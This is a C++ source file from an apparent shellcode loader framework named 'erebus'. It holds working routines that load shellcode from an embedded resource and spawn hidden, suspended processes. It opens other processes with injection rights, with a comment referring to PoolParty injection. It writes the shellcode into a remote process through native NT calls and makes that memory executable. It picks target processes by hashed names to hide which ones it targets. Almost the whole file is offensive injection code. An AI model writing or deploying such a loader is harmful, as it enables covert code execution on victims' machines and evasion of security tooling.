#include "../../include/loader.hpp"

namespace erebus {
	BOOL StageResource(IN int resource_id, IN LPCWSTR resource_class, OUT PBYTE* shellcode, OUT SIZE_T* shellcode_size)
	{
		BOOL success = FALSE;
		PVOID shellcode_address;

		HRSRC resource_handle = FindResourceW(nullptr, MAKEINTRESOURCEW(resource_id), resource_class);
		if (!resource_handle)
		{
			LOG_ERROR("Failed to get resource handle. (Code: 0x%08lX)", GetLastError());
			return success;
		}

		DWORD resource_size = SizeofResource(nullptr, resource_handle);

		HGLOBAL global_handle = LoadResource(nullptr, resource_handle);
		if (!global_handle)
		{
			LOG_ERROR("Failed to get global handle. (Code: 0x%08lX)", GetLastError());
			return success;
		}

		PVOID resource_pointer = LockResource(global_handle);
		if (!resource_pointer)
		{
			LOG_ERROR("Failed to get resource pointer. (Code: 0x%08lX)", GetLastError());
			return success;
		}

		shellcode_address = HeapAlloc(resource_size);
		if (shellcode_address)
		{
			RtlCopyMemory(shellcode_address, resource_pointer, resource_size);
			success = TRUE;
		}

		*shellcode_size = (SIZE_T)resource_size;
		*shellcode = (BYTE*)shellcode_address;
		return success;
	}

	PVOID WriteShellcodeInMemory(IN HANDLE process_handle, IN BYTE* shellcode, IN SIZE_T shellcode_size)
	{
		SIZE_T bytes_written = 0;
		PVOID base_address = NULL;
		DWORD old_protection = 0;
		SIZE_T allocation_size = shellcode_size;
		NTSTATUS status;

		// Validate input
		if (!shellcode || shellcode_size == 0)
		{
			LOG_ERROR("Invalid shellcode pointer or size");
			return NULL;
		}

		// Use standard Windows API instead of PEB-based resolution for MinGW compatibility
		HMODULE ntdll = GetModuleHandleA("ntdll.dll");
		if (!ntdll)
		{
			LOG_ERROR("Failed to get ntdll.dll handle");
			return NULL;
		}

		typeNtAllocateVirtualMemory NtAllocateVirtualMemory = (typeNtAllocateVirtualMemory)GetProcAddress(ntdll, "NtAllocateVirtualMemory");
		typeNtWriteVirtualMemory NtWriteVirtualMemory = (typeNtWriteVirtualMemory)GetProcAddress(ntdll, "NtWriteVirtualMemory");
		typeNtProtectVirtualMemory NtProtectVirtualMemory = (typeNtProtectVirtualMemory)GetProcAddress(ntdll, "NtProtectVirtualMemory");

		if (!NtAllocateVirtualMemory || !NtWriteVirtualMemory || !NtProtectVirtualMemory)
		{
			LOG_ERROR("Failed to resolve NT functions");
			return NULL;
		}

		status = NtAllocateVirtualMemory(process_handle, &base_address, 0, &allocation_size, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE);
		if (!NT_SUCCESS(status))
		{
			LOG_ERROR("Failed to allocate memory space (NTSTATUS: 0x%08lX)", status);
			return NULL;
		}
		LOG_SUCCESS("Address Pointer: 0x%p", base_address);

		status = NtWriteVirtualMemory(process_handle, base_address, (PVOID)shellcode, shellcode_size, &bytes_written);
		if (!NT_SUCCESS(status))
		{
			LOG_ERROR("Error writing shellcode to memory (NTSTATUS: 0x%08lX). (Wrote %zu/%zu bytes)", status, bytes_written, shellcode_size);
			return NULL;
		}
		
		if (bytes_written != shellcode_size)
		{
			LOG_ERROR("Incomplete write: wrote %zu/%zu bytes", bytes_written, shellcode_size);
			return NULL;
		}

		LOG_SUCCESS("Shellcode written to memory (%zu bytes).", bytes_written);

		status = NtProtectVirtualMemory(process_handle, &base_address, &allocation_size, PAGE_EXECUTE_READ, &old_protection);
		if (!NT_SUCCESS(status))
		{
			LOG_ERROR("Failed to change protection type (NTSTATUS: 0x%08lX)", status);
			return NULL;
		}

		LOG_SUCCESS("Protection changed to RX (was: 0x%lX).", old_protection);

		return base_address;
	}

	BOOL CreateProcessSuspended(IN wchar_t cmd[], OUT HANDLE* process_handle, OUT HANDLE* thread_handle)
	{
		STARTUPINFOW startup_info = {};
		PROCESS_INFORMATION process_info = {};

		BOOL success = CreateProcessW(
			NULL,
			cmd,
			NULL,
			NULL,
			FALSE,
			(CREATE_NO_WINDOW | CREATE_SUSPENDED),
			NULL,
			NULL,
			&startup_info,
			&process_info);

		*process_handle = process_info.hProcess;
		*thread_handle = process_info.hThread;

		return success;
	}

	//
	// Uses OpenProcess to get a handle to the process from a given PID
	// Returns NULL on failure.
	//
	HANDLE GetProcessHandle(DWORD process_id)
	{
		HANDLE process = INVALID_HANDLE_VALUE;

		if (!OpenProcess)
		{
			LOG_ERROR("GetProcAddress failed to get OpenProcess.");
			return NULL;
		}
		// Include PROCESS_QUERY_INFORMATION and PROCESS_DUP_HANDLE for PoolParty injection
		process = OpenProcess(
			PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_READ | 
			PROCESS_VM_WRITE | PROCESS_SET_QUOTA | PROCESS_QUERY_INFORMATION | 
			PROCESS_DUP_HANDLE, 
			FALSE, process_id);

		if (!process || process == INVALID_HANDLE_VALUE)
		{
			LOG_ERROR("OpenProcess failed for PID %lu (Error: 0x%08lX)", process_id, GetLastError());
			return NULL;
		}

		LOG_SUCCESS("Process Handle: 0x%p (PID: %lu)", process, process_id);

		return process;
	}


	//
	// Free a block of memory in the current process' heap.
	// Returns TRUE on success, FALSE on failure.
	//
	BOOL HeapFree(_In_ PVOID BlockAddress)
	{
		HMODULE ntdll = GetModuleHandleA("ntdll.dll");
		if (!ntdll) return FALSE;
		typeRtlFreeHeap RtlFreeHeap = (typeRtlFreeHeap)GetProcAddress(ntdll, "RtlFreeHeap");
		if (!RtlFreeHeap) return FALSE;

		return RtlFreeHeap(GetProcessHeap(), 0, BlockAddress) ? TRUE : FALSE;
	}

	//
	// Allocate a block of memory in the current process' heap.
	// Returns a pointer to the allocated block, or NULL on failure.
	//
	PVOID HeapAlloc(_In_ SIZE_T Size)
	{
		HMODULE ntdll = GetModuleHandleA("ntdll.dll");
		if (!ntdll) return NULL;
		typeRtlAllocateHeap RtlAllocateHeap = (typeRtlAllocateHeap)GetProcAddress(ntdll, "RtlAllocateHeap");
		if (!RtlAllocateHeap) return NULL;

		// RtlAllocateHeap returns NULL on failure so no need to add error handling.
		return RtlAllocateHeap(GetProcessHeap(), HEAP_ZERO_MEMORY, Size);
	}

	//
	// Uses NtQuerySystemInformation to enumerate processes and find the first occurance in the hashlist.
	// Returns NULL on failure.
	//
	DWORD ProcessGetPidFromHashedList(_In_ DWORD* HashList, _In_ SIZE_T EntryCount)
	{
		return ProcessGetPidFromHashedListEx(HashList, EntryCount, 0);
	}

	//
	// Extended version that returns the Nth matching process (skipCount = index to return)
	// Returns 0 on failure or if no more matches found.
	//
	DWORD ProcessGetPidFromHashedListEx(_In_ DWORD* HashList, _In_ SIZE_T EntryCount, _In_ SIZE_T skipCount)
	{
		HMODULE ntdll = GetModuleHandleA("ntdll.dll");
		if (!ntdll) return 0;

		typeNtQuerySystemInformation NtQuerySystemInformation = (typeNtQuerySystemInformation)GetProcAddress(ntdll, "NtQuerySystemInformation");
		if (!NtQuerySystemInformation) return 0;

		DWORD pid = 0, returnlength = 0, name_hash = 0;
		PSYSTEM_PROCESS_INFORMATION process = NULL, processinfoptr = NULL;
		NTSTATUS status = STATUS_SUCCESS;
		SIZE_T matchCount = 0;

		// Get size of systemprocessinformation
		NtQuerySystemInformation(SYSTEM_INFORMATION_CLASS::SystemProcessInformation, NULL, 0, &returnlength);
		returnlength += 0x10000;
		if (returnlength == 0)
			return 0;

		process = (PSYSTEM_PROCESS_INFORMATION)HeapAlloc(returnlength);
		if (!process) return 0;

		status = NtQuerySystemInformation(SystemProcessInformation, process, returnlength, &returnlength);
		if (!NT_SUCCESS(status))
			goto CLEANUP;

		processinfoptr = process;
		do
		{
			if (processinfoptr->ImageName.Buffer)
			{
				name_hash = erebus::HashStringFowlerNollVoVariant1a(processinfoptr->ImageName.Buffer);
				for (size_t i = 0; i < EntryCount; i++)
				{
					if (HashList[i] == name_hash)
					{
						if (matchCount == skipCount) {
							pid = (DWORD)(UINT_PTR)processinfoptr->UniqueProcessId;
							goto CLEANUP;
						}
						matchCount++;
						break;
					}
				}
			}

			processinfoptr = (PSYSTEM_PROCESS_INFORMATION)(((PBYTE)processinfoptr) + processinfoptr->NextEntryOffset);
		} while (processinfoptr->NextEntryOffset);

	CLEANUP:
		if (process)
			HeapFree(process);

		return pid;
	}
} // namespace erebus
